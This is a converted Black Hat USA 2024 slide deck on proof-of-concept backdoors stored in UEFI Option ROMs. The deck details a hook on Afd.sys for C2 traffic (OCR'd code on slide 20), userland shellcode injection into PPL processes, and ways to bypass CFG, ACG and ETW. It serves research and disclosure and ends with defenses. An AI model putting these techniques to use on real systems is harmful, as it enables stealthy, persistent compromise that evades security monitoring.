---
title: "You've Already Been Hacked What if There Is a Backdoor in Your UEFI OROM"
speakers: ["Kazuki Matsuo"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Kazuki Matsuo_You've Already Been Hacked What if There Is a Backdoor in Your UEFI OROM.pdf"
pages: 48
sha256: "1cd803e9eeddf636c9acd056c1ec823a0a4f010d4a0687a545017611735ea185"
text_chars: 20172
ocr_pages: 3
has_ocr: true
companion_files: ["Kazuki Matsuo_You've Already Been Hacked What if There Is a Backdoor in Your UEFI OROM_tools.txt"]
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:34:08Z"
---
# You've Already Been Hacked What if There Is a Backdoor in Your UEFI OROM

**Speakers:** Kazuki Matsuo  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Kazuki Matsuo_You've Already Been Hacked What if There Is a Backdoor in Your UEFI OROM.pdf` (48 pages)

## Slide 1

You‘ve Already Been Hacked What if There Is a Backdoor in Your UEFI OROM?

Kazuki Matsuo (@InfPCTechStack) 2024/8/8 South Seas CD, Level 3

#BHUSA @BlackHatEvents

## Slide 2

### Whoami - Kazuki Matsuo （@InfPCTechStack）

**Title：**

###### Security Researcher

**Affiliation：**

FFRI Security, Inc  &  Waseda University （This study was done during my master’s degree）

**Interests：**

UEFI （Negative Rings） Trusted Computing Windows Kernel

#BHUSA @BlackHatEvents

## Slide 3

# Contributors

###### **Yuki Mogi**

**Tatsuya Mori (@valdzone)**

- Security Researcher @ FFRI Security, Inc

   - Professor @ Waseda University

- Recently interested in security observability

   - Autonomous vehicle security

- Active in MWS, an academic cybersecurity community in Japan.

- <u>https://seclab.jp</u>

**Koh M. Nakagawa (@tsunek0h)**

- Security Researcher @ FFRI Security, Inc

- Vulnerability Research on macOS/iOS

- Black Hat EU 2020/Asia 2023, CODE BLUE (2021, 2023)

#BHUSA @BlackHatEvents

## Slide 4

# UEFI BIOS

- BIOS： System firmware that initializes hardware and boots the OS.

- UEFI： Standard for BIOS and defines the boot phases shown in the right figure.

- DXE： The phase where most devices are abstracted by multiple **DXE modules/drivers** .

- UEFI Protocol： Interface for accessing the device produced in the DXE phase. (e.g. HttpProtocol, SimpleFileSystemProtocol…)

- Runtime DXE modules： Some DXE modules persist in memory during runtime. (Most DXE modules are unloaded before OS boot)

#BHUSA @BlackHatEvents

## Slide 5

# OROM

aka Opt i on ROM, PCI Expans i on ROM, XROM

- Contains DXE drivers that initialize the device.

← OROM

- Present both in external and internal devices

OROM↓

- Often present in network cards, storage devices, graphic cards, and adapters.

- DXE drivers in OROM get loaded at PCI enumeration phase (pretty early in DXE).

- Legacy BIOS OROM and UEFI OROM is different. This talk is about UEFI OROM.

#BHUSA @BlackHatEvents

## Slide 6

# This Talk is about …

- Investigating what can backdoors stored in OROM do

- Clarifying the merits of storing backdoor inside OROM

- Implementing 3 PoC OROM backdoor based on the above merits

- • Considering how to defend against these backdoors

#BHUSA @BlackHatEvents

## Slide 7

# Why infect OROM ?

**Merit 1** : Stealthier place to put malware

- HDD/SSD: Easy to detect

- SPI Flash (BIOS): Some EDRs are beginning to look here

- OROM: **No versatile ways to read OROM from software**

Userland Kernel

**Merit 2** : Directly infect privileged layer (ring 0)

UEFI

- Can infect UEFI **directly without touching userland or kernel**

- => OROM malware can be **stealthy** and **powerful** backdoor

#BHUSA @BlackHatEvents

## Slide 8

# Infection Scenarios for OROM malware

- Device infected with OROM malware gets integrated into SoCs in the supply chain

- A third-party attacker writes malware to the device's OROM and sells it through online marketplaces

- Usermode malware writes malware to the OROM (Merit2 will be lost though…)

• Evil-Maid attacks

#BHUSA @BlackHatEvents

## Slide 9

# Existing UEFI OROM research

- Infect OROM on Apple Thunderbolt ethernet adapter for persistence [Loukas, 2012]

- Infect OROM for lateral movement of MacBook firmware worm <u>[Trammell, 2015]</u>

   - Immediately infect back to SPI flash after booting with tampered OROM

- Acquire UEFI OROM images by memory forensics [Johannes, 2015]

- Change boot media by OROM on Thunderbolt-to-Ethernet adapter <u>[Vault7, 2012]</u>

- Few research on OROM. No research focusing only on OROM.

- The merit of **directly infecting UEFI with more practical infection scenario**

- **(than just evil-maid)** is not focused.

#BHUSA @BlackHatEvents

## Slide 10

# Infect up to which Layer ?

##### **Strong**

#### **UEFI**

- Able： rw files / simple network communication

- Unable： time-consuming tasks / persistent network communication

#### **UEFI + Kernel**

Stealthiness

- Able： persistent network communication

- Unable： use advanced functions such as shells

**UEFI + Kernel + Userland**

- Able: anything

Weak

- ＊Existing UEFI malwares are all this.

#BHUSA @BlackHatEvents

## Slide 11

# UEFI only Backdoor

- The most important thing for a backdoor is to be able to communicate over the network →use HttpProtocol

- For the data to send, we can read file from the disk. →use SimpleFileSystemProtocol & FileProtocol

- UEFI protocol is the key for implementing UEFI only backdoor

But be careful that,

- Protocols are unloaded when OS boots up (cannot achieve persistent connection)

- Time-consuming tasks make the boot time long which is suspicious

. ＊ Also, not a backdoor, but there is PoC ransomware using only UEFI [Alex, 2017]

#BHUSA @BlackHatEvents

## Slide 12

# HttpProtocol

###### Fig 2. Definition of HttpProtocol

Fig 1. Example usage

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2) |
blackhat
USA 2024
“4
HttpProtocol
EFI_HTTP_CONFIG_DATA ConfigData;
ConfigData.HttpVersion = HttpVersion11;
ConfigData. TimeOutMilLisec = 0;
ConfigData.LocalAddressIsIPv6 = FALSE;
ConfigData.AccessPoint.IPv4Node = &Ipv4Node;
Status = gHttpProtocol—Configure(
gHttpProtocol,
&ConfigData
dj
RequestToken.Message = &RequestMessage;
gRequestCaLLbackComplete FALSE;
Status = gHttpProtocol—Request(
gHttpProtocol,
&RequestToken) ;
Fig 1. Example usage
EFI_LHTTP_PROTOCOL
typedef struct _EFI_HTTP_PROTOCOL {
EFI_HTTP_GET MODE DATA GetModeData;
EFI_HTTP_CONFIGURE Configure;
Request;
Cancel;
Response;
PoLL;
EFI_HTTP_REQUEST
EFI_HTTP_CANCEL
EFI_HTTP_RESPONSE
EFI_HTTP_POLL
} EFI_HTTP_PROTOCOL;
Fig 2. Definition of HttpProtocol
#BHUSA @BlackHatEvents
```

## Slide 13

# Enabling HttpProtocol

- HttpProtocol is mainly used for HTTP boot and is disabled by default.

- Can be enabled from BIOS setup screen.

- This configuration is often stored in UEFI variable “NetworkStackVar”

- Modify this variable to enable

#BHUSA @BlackHatEvents

## Slide 14

### SimpleFileSystemProtocol & FileProtocol

- UEFI usually supports only FAT, while windows uses NTFS

- Some BIOS contain AMI NTFS DXE driver which is read-only

- We can put vector-edk’s NtfsDxe into the OROM image to install the protocol for NTFS

#BHUSA @BlackHatEvents

## Slide 15

## Demo

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2024/01/19 23:53 JAW IAWI-
i if
2019/12/07 18:14 TPAWIAWS-
2023/12/01 19:32 PAW IAN
2023/04/30 20:58 774 WV TANW-
2023/02/21 1:48 774 JAN-
2024/02/27 19:21 774 Ib JA—-
2023/04/17 21:27 774 Ib Jal—
24/03/07 17:45 lca
2023/04/17 21:29 F47b KEIXYb
| @& secret txt - AEE
WOUUR EH BAO) BRVY ATH)
\VerySecretDatal
```

## Slide 16

### Example scenarios for UEFI only Malware

- Stealing files (demo)

   - SimpleFileSystemProtocol/FileProtocol to read files, HttpProtocol to send them

- Stealing application data

   1. Runtime DXE module searches through virtual memory for important data 2. The module stores the data into non-volatile storages such as UEFI variables

   3. Next time the PC boot, the module reads the data and send it via HttpProtocol

- Receving C2 commands

   - When the victim PC boots, the DXE module receives commands from C2 server via HttpProtocol and performs simple tasks (e.g. encrypting files).

   - Note that, we cannot perform lengthy tasks and the commands can be received only during the boot phase (which is very short) #BHUSA @BlackHatEvents

#BHUSA @BlackHatEvents

## Slide 17

# UEFI+Kernel Backdoor

- If you want persistent connection during runtime, you want to at least use the kernel • You can access network cards from PCIe tree using only UEFI modules, but that will make the backdoor very hardware specific.

- Runtime DXE driver can use kernel exports by

   1. Find ntoskrnl.exe base address

   2. Parse PE headers and resolve the address of exports

- Network communication in kernel level

   - WSK (WinSock Kernel)

   - TDI (Transport Device Interface)

＊ They both are just IOCTLs to the Afd.sys

#BHUSA @BlackHatEvents

## Slide 18

# Execution of kernel level code

- Common ways to execute kernel level code

   - Install kernel driver

      - Easy to detect (DSE, listing DriverObject, …)

   - Kernel shellcode

      - Existing malwares often hook Windows initialization process to allocate and execute kernel shellcode

      - Require multiple hooks based on pattern matching which is unstable

- Directly use kernel exports from runtime DXE driver

   - Merit 1: Widely known monitoring tools or debuggers don’t recognize runtime DXE Driver (unlike kernel drivers) on Windows

   - Merit 2: No need to allocate memory for placing shellcode through the kernel's I/O manager (which is stealthy).

   - Demerit 1: Cannot use some kernel exports due to the lack of DriverObject

#BHUSA @BlackHatEvents

## Slide 19

# Hooking Afd.sys

• Most socket communications on Windows are IOCTLs to Afd.sys • We can hook the Major Function of _¥Driver¥Afd_ to intercept/modify/add communication

#BHUSA @BlackHatEvents

## Slide 20

# Hooking Afd.sys

↓Look for Magic Bytes, if found →

Add extra data to send back

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
~
SS
bisekhat a. “
Hooking Afd.sys
\ Look for Magic Bytes,
if found >
NTSTATUS
__attribute__((__ms_abi__))
MajorDeviceControlHook(
IN PVOID DeviceObject,
IN PIRP _Irp
)
PIO_STACK_LOCATION IrpStackLocation = IoGetCurrentIrpStackLocatio
ULONG IoControlCode = IrpStackLocation—Parameters .DeviceIoContro
PVOID InputBuffer = IrpStackLocation—Parameters.DeviceloControl.
PVOID SocketObject = IrpStackLocation—FileObject;
if(IoControlCode == IOCTL_AFD_RECV) {
PAFD_RECV_INFO Recvinfo = (PAFD_RECV_INFO)InputBuffer;
if(RecvInfo—BufferCount < 1)
goto Exit;
for (ULONG i = 0; i < RecvInfo—BufferCount; i+) f
UINT DataLen = RecvInfo—BufferArray[i].len;
PVOID Data (PVOID)RecvInfo—BufferArray[i] . buf;
if(DataLen < 8) goto Exit;
if(!MmIsAddressValid(Data)) goto Exit;
for (UINT j = 0; j < DataLen; j+) f
if(j>0x100)
goto Exit; // MAGIC must be within the first 0x100 bytes
if (@(CUINT64*)(Datat+j) == MAGIC) {
// send tp C2
char SendData[] = "\nMessage from OROM malware!!!\n";
WsaBuf.buf = SendData;
WsaBuf.len = sizeof(SendData);
SendInfo.BufferArray = &WsaBuf;
SendInfo.BufferCount 1;
SendiInfo.AfdFlags = 0;
SendInfo.TdiFlags = 0;
Irp = IoBuildDeviceIoControlRequest(
IOCTL_AFD_SEND,
AfdDeviceObject,
&SendInfo,
sizeof (AFD_SEND_INFO),
NULL, Add extra data
0,
socketEvent, to send back
Se oe
Irp—RequestorMode = KernelMode;
Irp—Tail.Overlay.OriginalFileObject = SocketObject;
PIO_STACK_LOCATION IrpStack = IoGetNextIrpStackLocation(Irp);
IrpStack—FileObject = SocketObject;
ObReferenceObject(SocketObject);
ToCallDriver(
AfdDeviceObject,
Ir
Dir
#BHUSA @BlackHatEvents
```

## Slide 21

# When to hook Afd.sys

- How to trigger runtime DXE driver code during runtime?

- GetVariable runtime service is often called even during runtime

- We can hook GetVariable to obtain periodic code execution

- We can hook Afd.sys in the GetVariableHook

#BHUSA @BlackHatEvents

## Slide 22

## Demo

#BHUSA @BlackHatEvents

## Slide 23

# Full-Kernel Malware

- Full-Kernel Malware： Malicious behavior only in the kernel layer (without userland) • e.g. Srizbi, Mebroot, Rustock [Kimmo, 2010]

- Existed about 15 years ago, but it’s **not popular at all** recently

Why? Probably because,

- Improvement of kernel security

   - Driver Signature Enforcement, PatchGuard, HVCI (Memory Integrity)

- Installation of kernel driver requires userland installer anyway

   - Easier to implement malicious task on userland and hide that from driver

- Full-Kernel Malware ≒ UEFI+Kernel Malware, with less impact of kernel security above, with no userland installer required

#BHUSA @BlackHatEvents

## Slide 24

# UEFI+Kernel+Userland Backdoor

- If you want to do more complicated things like accessing the shell, you need to use userland code

- All existing UEFI malware execute the main malicious tasks on userland • Writing malicious EXE to disk by NtfsDxe or DLL injection is often used

- Using runtime DXE module allows for **more stealthy techniques** than existing UEFI malware.

#BHUSA @BlackHatEvents

## Slide 25

# Advantages of Runtime DXE Driver

- Resides in memory during both the boot phase and the runtime phase

- We can take advantage of this and do things like below:

   1. Allocate buffer during the boot phase

   2. OS boots and enter runtime phase

   3. Writes shellcode to the buffer

   4. Modify page table to make the buffer accessible from userland

   5. Start a userland thread to execute the shellcode

- We can make detection more difficult by transferring part of the malicious tasks to the boot phase

#BHUSA @BlackHatEvents

## Slide 26

# What process to use?

- Exisiting UEFI malwares often use winlogon.exe or svchost.exe

- To make it stealthier, we can instead use PPL

- EDR cannot inject detection code into PPL of which signers are Windows or WinTcb

#BHUSA @BlackHatEvents

## Slide 27

# Userland Shellcode Execution Flow

Userland Userland
Kernel+UEFI Kernel+UEFI
①Allocate Buffer
Buffer Buffer
during boot phase

EDR Process

WinTcb-Light Process

#BHUSA @BlackHatEvents

## Slide 28

# Userland Shellcode Execution Flow

Userland Userland
Kernel+UEFI Kernel+UEFI
②Write userland
Shellcode shellcode after Shellcode
OS boot.

WinTcb-Light Process

EDR Process

#BHUSA @BlackHatEvents

## Slide 29

# Userland Shellcode Execution Flow

Userland Userland
Kernel+UEFI Kernel+UEFI
③Modify page table
Shellcode and make this shellcode Shellcode
accessible from userland

WinTcb-Light Process

EDR Process

#BHUSA @BlackHatEvents

## Slide 30

# Userland Shellcode Execution Flow

Userland Userland
④RtlCreateUserThread
Kernel+UEFI Kernel+UEFI
⑤Execute! Shellcode Cannot detect Shellcode
due to high PPL
WinTcb-Light Process EDR Process

#BHUSA @BlackHatEvents

## Slide 31

# Ring0→Ring3 Buffer

47 39 38 30 29 21 20 12 11 0
Virtual Address PML4 Index PDP Index PD Index PT Index Physical Offset
PDE
PML4E
Physical
PDPTE
Address
PTE
PML4 Table PDP Table PD Table Page Table 4KB Page
(Page-Map Level-4) (Page Directory Pointer) (Page Directory) (Physical Memory)
63 M M-1 12 4 3 2 0
P P Set the UserSupervisor bit in each
CR3 Reserved PML4 Base Address C W
D T
PML4E/PDPTE/PDE/PTE
#BHUSA @BlackHatEvents

## Slide 32

# Ring0→Ring3 Buffer

47

39 38 30 29 21 20

12 11

0

**Virtual Address** PML4 Index

PDP Index PD Index PT Index Physical Offset

- The address in CR3 and other page table entries are **physical address**

- • But, runtime DXE driver is running on **virtual address** PDE

- • It seems ~~Mm~~ GetViPML4E ~~rtu~~ alForPhysical do <u>es NOT s upport addresses related to UEFI</u> **Physical**

|PDPTE
PML4 Table
(Page-Map Level-4)
PDP Table
(Page Directory Pointer)|PD Table
(Page Directory)|PTE
Page Table|**Address**
4KB Page
(Physical Memory)|
|---|---|---|---|
|63
M M-1
0
2
3
4
12
CR3
Reserved
P
W
T
P
C
D
PML4 Base Address|Set the
PM|UserSuperviso
L4E/PDPTE/P|r bitin each
DE/PTE|

#BHUSA @BlackHatEvents

## Slide 33

# Partial Identity Mapping

- Create identity page table and set it to CR3 ? => **No.** Currently executing instructions are on the virtual address

- Runtime DXE driver is mapped to the high canonical virtual memory address and doesn’t use PML4[0]

- On the other hand, identity paging only uses PML4[0]

- We can swap only PML4[0] of the current page table

   - => Runtime DXE driver runs normally on **virtual address** , but switches to identity map only when trying to access **physical address** !

#BHUSA @BlackHatEvents

## Slide 34

# CFG & ACG Bypass

- After writing shellcode to the buffer and setting the UserSupervisor bit, we can execute it by calling RtlCreateUserThread

- However, CFG (Control Flow Guard) will prevent execution of the shellcode

   - Since the shellcode is in high canonical address, CFGbitmap overflows and causes access violation

- => We can patch ntdll!LdrpDispatchUserCallTarget to jmp without check

- However, making the page writable by ZwProtectVirtualMemory is prevented by ACG (Arbitrary Code Guard)

- => We can use partial identity table (which is writable) to patch it

#BHUSA @BlackHatEvents

## Slide 35

# CFG & ACG Bypass

mov [address], 0xFF
63 M M-1 12 2 1 0
U R
if Phy addr PML4[0] Nx Address / /
S W
Writable
1
PDP/PD/PT Table Physical Page
(Partial Identity Tables)
63 M M-1 12 2 1 0
U R
Nx Address / /
if Virt addr
PML4[N] S W
Non-Writable
0
PML4 Table PDP/PD/PT Table Physical Page
(Page Tables of PPL)

#BHUSA @BlackHatEvents

## Slide 36

# ETW Bypass

- By now, RtlCreateUserThread wouldn’t fail and shellcode should execute successfully

- However, the fact that the thread starting with high canonical address (which is suspicious) is still logged by ETW (Event Tracing for Windows)

- • Existing UEFI malware doesn’t deal with ETW (As far as I read the report by security vendors)

- Similarly to CFG bypass, patching nt!EtwWrite & nt!EtwWriteEx to return immediately can disable ETW

#BHUSA @BlackHatEvents

## Slide 37

### UEFI+Kernel+Userland Malware Summary

1. Allocate buffer & partial identity table during boot time

2. OS boots and enter runtime phase

3. Execution is transferred to the runtime DXE module via runtime service hook

4. Set the process context to a PPL process (in my PoC, it’s csrss.exe)

5. Modify page table to make shellcode buffer accessible from userland

6. Write shellcode into the buffer

7. Patch ntdll!LdrpDispatchUserCallTarget to bypass CFG

8. Patch nt!EtwWrite & nt!EtwWriteEx to bypass ETW

9. Execute shellcode with RtlCreateUserThread

10. Restore patched functions and execute original runtime service

#BHUSA @BlackHatEvents

## Slide 38

Demo

#BHUSA @BlackHatEvents

## Slide 39

# How to Defend

- Enable secure boot (for OROM) to protect against third-party attacker without legitimate certificate

   - Lookout for secure boot bypass vulnerabilities and fix them

- For supply-chain attack, we need to extract OROM and investigate whether it contains backdoor or not

   - Currently, there are no promising tool to do this

- Look for suspicious network traffic

#BHUSA @BlackHatEvents

## Slide 40

# Wrap up

- OROM is a stealthy place to put backdoor

- Can directly infect UEFI with wide infection scenario

- Implemented UEFI, UEFI+Kernel, UEFI+KM+UM PoC malware

- Explained method to defend against OROM backdoor

#BHUSA @BlackHatEvents

## Slide 41

# Disclaimer

This document is a work of authorship performed by FFRI Security, Inc. (hereafter referred to as "the Company"). As such, all copyrights of this document are owned by the Company and are protected under Japanese copyright law and international treaties. Unauthorized reproduction, adaptation, distribution, or public transmission of this document, in whole or in part, without the prior permission of the Company is prohibited.

While the Company has taken great care to ensure the accuracy, completeness, and utility of the information contained in this document, it does not guarantee these qualities. The Company will not be liable for any damages arising from or related to this document. ©FFRI Security, Inc. Author: FFRI Security, Inc.

#BHUSA @BlackHatEvents

## Slide 42

# Thank you for listening!

Contacts X DM: <u>https://twitter.com/ffri_research</u> e-mail: <u>research-feedback@ffri.jp</u>

Repo <u>https://github.com/FFRI/orom-backdoor-research</u>

#BHUSA @BlackHatEvents

## Slide 43

# Appendix

#BHUSA @BlackHatEvents

## Slide 44

# Environment

- <u>UP2 Pro (single board computer)</u>

   - Intel Atom Quad Core 64bit

- Windows 10

- VBS (HVCI) disabled

   - Cannot enable because it requires secure boot to be enabled

- <u>M.2 B+M Key  SATA adapter</u>

   - OROM: SPI flash

#BHUSA @BlackHatEvents

## Slide 45

# Writing OROM

- Software

   - Dependent on the device (Vendor may provide tools to write)

- Hardware

   - Some external devices has SOP/SOIC SPI flash

   - Write it directly using such tools like BusPirate

Take it off if power line is shared with the microcontroller

#BHUSA @BlackHatEvents

## Slide 46

# Building OROM image

- Tools to build OROM image

   - EfiRom utility (EDK2 BaseTools)

   - You can also use my tool (orom-builder)

- You can dump ROM and look for “55 AA” signature to check if that ROM is OROM or not.

- DXE module can be compressed

- Can contain multiple OROM image (DXE driver) in a ROM.

<u>https://uefi.org/sites/default/files/resources/UEFI_Spec_2 _8_C_Jan_2021.pdf#page=807</u>

#BHUSA @BlackHatEvents

## Slide 47

# Without ETW Bypass

ETW that logs kernel events

Shell that OROM malware created

**ETW logs the shellcode address**

#BHUSA @BlackHatEvents

## Slide 48

# Novelty of this research

- First PoC OROM backdoor for Windows

- First OROM focused infection scenario and backdoor

- HttpProtocol for C2 communication

- Using kernel exports from runtime DXE driver

- Partial Identity Mapping

   - Usermode accessible UEFI allocated shellcode

   - CFG & ACG bypass

#BHUSA @BlackHatEvents

## Companion resources

### `Kazuki Matsuo_You've Already Been Hacked What if There Is a Backdoor in Your UEFI OROM_tools.txt`

```text
https://github.com/FFRI/orom-backdoor-research
```
